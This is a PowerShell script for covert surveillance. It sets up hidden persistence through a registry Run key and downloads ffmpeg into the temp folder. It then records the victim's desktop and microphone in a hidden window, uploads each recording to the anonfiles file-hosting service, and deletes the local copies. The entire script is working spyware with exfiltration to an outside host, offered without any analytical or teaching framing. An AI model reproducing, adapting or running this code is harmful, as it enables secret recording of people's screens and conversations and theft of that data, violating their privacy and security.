function Add-LoggerPersistency {
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[string]$name,
        [parameter(Mandatory=$True)]
		[string]$Command,
        [parameter(Mandatory=$False)]
		[string]$Days = 0 
	);

    if($Days -eq -1 -or $Days -gt 0){
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
    
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $Command;
    
        if($Days -eq -1){ return };
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
    
        $date = (Get-Date).AddDays($Days);
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date" -Value $date;
    }
    
    if($Days -gt 0){
        $date = Get-Date;
        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date";
        $targetDate = [DateTime]$targetValue.date;
    
        if($date -lt $targetDate){ return }
    
        Remove-Item "$env:temp\$name.ps1" -Force;
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
    }
}

function Upload-File{
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[string]$path
	);   
     
    $url="https://api.anonfiles.com/upload?token=$Anontoken";

    if(Test-Path $path){
        (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
        Remove-Item $path -Force;
    }
}

function Start-Screenlogger{
    [CmdletBinding()]
    param
    (
      [Parameter(Mandatory=$False)]
      [int]$RecordTime = 10,      
      [Parameter(Mandatory=$False)]
      [int]$TimesRun = 1,      
      [Parameter(Mandatory=$False)]
      [int]$Delay = 0
    );
    
    if($RecordTime -eq 0){$RecordTime=10}
    if($TimesRun -eq 0){$TimesRun=1}
    if($Delay -eq 0){$Delay=0}
    
    $count = 0;
    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object { $_.Name -like "*Microphone*" })[0].name;
    
    while($count -ne $TimesRun){
        $time = Get-Date -Format "ddMMyyyyHHmm";
        $path = "$env:temp\screenlog-$env:computername-$time.mkv";
        $ffmpegArgs = @(
            "-f gdigrab",
            "-s 1280x720",
            "-r 30",
            "-rtbufsize 1024M",
            "-thread_queue_size 1024",
            "-i `"desktop`"", 
            "-f dshow",
            "-i audio=`"$mic`""
            "-t $RecordTime",
            "-y",
            "$path"
        );

        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs" -Wait -WindowStyle hidden;
        Upload-File $path;
        
        Start-Sleep $Delay;
        $count++;
    }
}

$ProgressPreference = "SilentlyContinue";

New-Item -Path $env:temp -ItemType Directory -Force;
Set-Location $env:temp;

if(-not (Test-Path -Path "ffmpeg-master-latest-win64-gpl/bin/ffmpeg.exe" -PathType Leaf)){
    Invoke-WebRequest "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip" -OutFile "ffmpeg.zip" | Wait-Process;
    Expand-Archive "ffmpeg.zip" -DestinationPath "." -Force | Wait-Process;
    Remove-Item "ffmpeg.zip" -Force;
}

$name = "screenlog";
$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item ' + $name + '.ps1 | Invoke-Expression;sleep 5;exit');

Add-LoggerPersistency $name -Command $autostart -Days $DaysRun
Start-Screenlogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;